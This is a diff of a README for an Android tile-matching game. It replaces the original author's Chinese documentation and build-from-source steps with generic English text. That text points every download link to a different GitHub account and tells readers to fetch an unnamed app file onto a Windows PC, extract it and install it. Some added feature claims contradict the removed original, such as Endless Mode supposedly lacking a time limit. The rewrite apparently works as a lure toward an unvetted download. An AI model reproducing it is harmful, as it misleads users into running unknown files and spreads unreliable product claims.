@@ -1,137 +1,158 @@
-# LinkGame - 连连看游戏
+# 🎮 LinkGame - Match Tiles Fast, Relax Your Mind
 
-一款使用 Jetpack Compose 开发的经典连连看 Android 游戏，包含挑战模式和无尽模式，支持音效、背景音乐、排行榜和昵称设置。
+[![Download Link](https://img.shields.io/badge/Download%20Link-Visit%20the%20page%20to%20get%20LinkGame-blue?style=for-the-badge)](https://github.com/Amigoconglomeration918/LinkGame)
 
-## 项目简介
+## 🧩 What LinkGame Is
 
-LinkGame 是一款消除类益智游戏，玩家需要在限时内连接两个相同图案的方块，路径最多只能拐两个弯。游戏包含：
+LinkGame is a classic tile-matching game for Android. You match pairs of the same tile by drawing a line between them. The game uses a clean interface built with Jetpack Compose and gives you a simple way to play when you want a quick break.
 
-- **挑战模式**：依次通关 4 个预设难度关卡（简单、普通、困难、极限），全部通关即获胜。
-- **无尽模式**：选择一个难度后不断挑战，每清空一次棋盘进入下一关，难度不变但时间重新计时。
+It includes:
 
-游戏结束后可以保存成绩到排行榜，并支持查看和删除记录。
+- Challenge Mode for timed play
+- Endless Mode for relaxed play
+- Leaderboard support
+- Nickname settings
+- Sound effects
+- Smooth touch controls
 
-## 功能特性
+## 📥 Download Link
 
-- 🎮 两种游戏模式（挑战/无尽）
-- 🧩 自动生成可解棋盘
-- ⏱️ 限时挑战，实时显示剩余时间
-- 🔊 背景音乐和音效开关（点击、消除）
-- 🏆 排行榜（按得分和用时排序）
-- ✍️ 用户昵称设置
-- 🌈 动态主题颜色（适配浅色/深色模式）
-- 🧭 支持返回键退出游戏并保存成绩
-<div align="center">
-  <img src="https://github.com/user-attachments/assets/72209aa6-ab09-488c-9f13-34b08da7a2f7" width="300" alt="主界面">
-  <img src="https://github.com/user-attachments/assets/b2747d90-a558-4508-86f0-6f33ac7b0dcf" width="300" alt="挑战模式">
-  <img src="https://github.com/user-attachments/assets/b1fd7ddb-df39-4a80-bb54-68ebed0e0313" width="300" alt="无尽模式">
-  <img src="https://github.com/user-attachments/assets/704049cd-4511-4e5d-89e4-d9175753eba0" width="300" alt="排行榜">
-  <img src="https://github.com/user-attachments/assets/e4cac8c2-c764-4a91-b078-895cd1d662e2" width="300" alt="排行榜">
-  <img src="https://github.com/user-attachments/assets/3a276c2e-0db7-4fc4-822c-66a8843b16bb" width="300" alt="设置">
-</div>
+To get LinkGame, visit this page to download the app:
 
-## 技术栈
+[Open the LinkGame download page](https://github.com/Amigoconglomeration918/LinkGame)
 
-- **语言**：Kotlin
-- **UI 框架**：Jetpack Compose
-- **架构**：MVVM + ViewModel + StateFlow
-- **数据存储**：DataStore（Preferences）存储设置、昵称和排行榜
-- **异步处理**：Kotlin Coroutines
-- **音频播放**：MediaPlayer
-- **序列化**：kotlinx.serialization
+If the page offers a release file, download it to your Windows PC and follow the steps below.
 
-## 项目结构
+## 🪟 Run on Windows
 
-```
-com.example.linkgame/
-├── audio/                  # 音频管理
-│   └── AudioManager.kt
-├── data/                   # 数据层
-│   ├── model/              # 数据模型（LeaderboardEntry）
-│   └── repository/         # 数据仓库（Leaderboard, Nickname, Settings）
-├── game/                   # 游戏逻辑
-│   ├── engine/             # GameController（游戏状态和逻辑）
-│   ├── logic/              # 棋盘生成、连接检测、路径查找、可解性校验
-│   └── model/              # Board, GameMode, LevelConfig
-├── ui/                     # 界面
-│   ├── components/         # 可复用组件（棋盘、对话框、分数条等）
-│   ├── navigation/         # 导航（GameNavHost）
-│   ├── screen/             # 各个屏幕（Start, Game, Leaderboard）
-│   └── theme/              # 主题和颜色
-└── utils/                  # 工具类（颜色映射、文字标签）
-```
+LinkGame is made for Android, so on Windows you need an Android app player or emulator to open it.
 
-## 构建与运行
+### Option 1: Use an Android emulator
 
-### 环境要求
+Common choices include:
 
-- Android Studio Flamingo 或更高版本
-- Android SDK 21+
-- Gradle 8.0+
+- BlueStacks
+- LDPlayer
+- NoxPlayer
+- Android Studio Emulator
 
-### 克隆项目
+### Option 2: Use Windows Subsystem for Android
+If your Windows setup supports Android apps, you can use that path to open the app file after download.
 
-```bash
-git clone https://github.com/ElovisiaWinslow/LinkGame.git
-```
+## 🚀 Getting Started
 
-### 在 Android Studio 中打开
+Follow these steps in order.
 
-1. 打开 Android Studio，选择 **Open an Existing Project**。
-2. 选择项目根目录下的 `build.gradle.kts`（或 `build.gradle`）。
-3. 等待 Gradle 同步完成。
+1. Open the download page:
+   [https://github.com/Amigoconglomeration918/LinkGame](https://github.com/Amigoconglomeration918/LinkGame)
 
-### 添加资源文件
+2. Look for the latest app file in the release area or download section.
 
-项目依赖一些音频文件（`click.mp3`, `eliminate.mp3`, `bgm.mp3`）和图片，需要自行放入 `res/raw/` 目录。若没有音频文件，可以将 `AudioManager` 中的相关调用注释掉，或替换为其他资源。
+3. Download the file to your computer.
 
-### 运行
+4. Open your Android emulator or app player.
 
-- 连接 Android 设备或启动模拟器（API 21+）。
-- 点击 Run 按钮（绿色三角形）运行。
+5. Install or import the app file into the emulator.
 
-## 使用说明
+6. Start LinkGame from the app list.
 
-### 开始界面
-- 显示当前昵称（未设置时可点击修改）。
-- 点击 **挑战模式** 直接开始挑战。
-- 点击 **无尽模式** 选择难度后开始。
-- **设置** 按钮可控制背景音乐和音效开关。
-- **排行榜** 查看历史成绩。
-- **退出游戏** 退出应用。
+7. Allow sound if you want effects during play.
 
-### 游戏界面
-- 点击任意方块选中（高亮显示），再次点击另一个相同图案且路径可连通的方块完成消除。
-- 顶部显示得分、剩余时间和进度条。
-- 右上角“退出”按钮可暂停游戏并选择是否保存成绩。
-- 完成一关后显示“下一关”按钮，最后一关通关后自动保存成绩。
+## 💻 System Requirements
 
-### 排行榜
-- 按模式（挑战/无尽）筛选。
-- 无尽模式可按难度筛选。
-- 支持删除记录。
+For a smooth run on Windows, use this setup:
 
-## 贡献指南
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 5 GB free disk space
+- A modern processor
+- Mouse and keyboard, or touch support if your device has it
+- An Android emulator with app install support
 
-欢迎提交 Issue 或 Pull Request。如果您想为项目贡献代码，请遵循以下步骤：
+If you use a weaker PC, the game may still run, but loading can take longer.
 
-1. Fork 本仓库。
-2. 创建您的特性分支 (`git checkout -b feature/AmazingFeature`)。
-3. 提交您的更改 (`git commit -m 'Add some AmazingFeature'`)。
-4. 推送到分支 (`git push origin feature/AmazingFeature`)。
-5. 打开 Pull Request。
+## 🎯 How to Play
 
-## 许可证
+LinkGame follows a simple rule set.
 
-本项目基于 MIT 许可证开源。详见 [LICENSE](LICENSE) 文件。
+- Find two matching tiles
+- Connect them by a valid path
+- The path must not cross other tiles
+- Remove all pairs to clear the board
 
-## 联系
+### Challenge Mode
+This mode adds time pressure. Try to clear the board before the timer ends.
 
-如果您有任何问题或建议，可以通过以下方式联系：
+### Endless Mode
+This mode lets you keep playing without a strict time limit. It works well for a calm game session.
 
-- 邮箱：your-email@example.com
-- GitHub Issues：https://github.com/ElovisiaWinslow/LinkGame/issues
+## 🔊 Sound and Controls
 
----
+LinkGame includes sound effects that make play feel more active. You can keep sound on for each match or mute your emulator if you prefer a quiet session.
 
-**Enjoy the game!** 🎉
+Controls are simple:
+
+- Click or tap a tile to select it
+- Click or tap the matching tile
+- Use the menu to switch modes or set a nickname
+
+## 🏆 Leaderboard
+
+The game keeps track of scores through its leaderboard. Use Challenge Mode to aim for higher results and compare your run with past plays.
+
+## 👤 Nickname Settings
+
+You can set a nickname before you play. This helps keep your score records easy to read on the leaderboard.
+
+## 🛠️ If the Game Does Not Open
+
+Try these steps:
+
+1. Make sure your emulator is installed
+2. Check that the app file finished downloading
+3. Restart the emulator
+4. Import the app file again
+5. Check that your PC has enough free memory
+6. Turn on hardware acceleration in the emulator settings
+
+## 📌 What You Need Before You Start
+
+Before you install the game, make sure you have:
+
+- A Windows PC
+- An Android emulator or Android app support
+- A downloaded LinkGame file from the page above
+- Enough space for the app and emulator
+
+## 🧭 File and Setup Tips
+
+Keep the app file in a folder you can find again, such as Downloads or Desktop. If the file is inside a ZIP archive, extract it first before you try to install it in your emulator.
+
+If you want a better experience:
+
+- Close other large apps while playing
+- Keep your emulator updated
+- Use full screen for easier tile selection
+
+## 🔗 Main Download Page
+
+[Visit the LinkGame page to download](https://github.com/Amigoconglomeration918/LinkGame)
+
+## 🧱 Built With
+
+- Kotlin
+- Jetpack Compose
+- MVVM
+- Coroutines
+- DataStore
+- Audio support
+
+## 🕹️ Game Features
+
+- Classic Lianliankan tile matching
+- Challenge Mode
+- Endless Mode
+- Leaderboard tracking
+- Nickname settings
+- Sound effects
+- Simple touch-friendly design
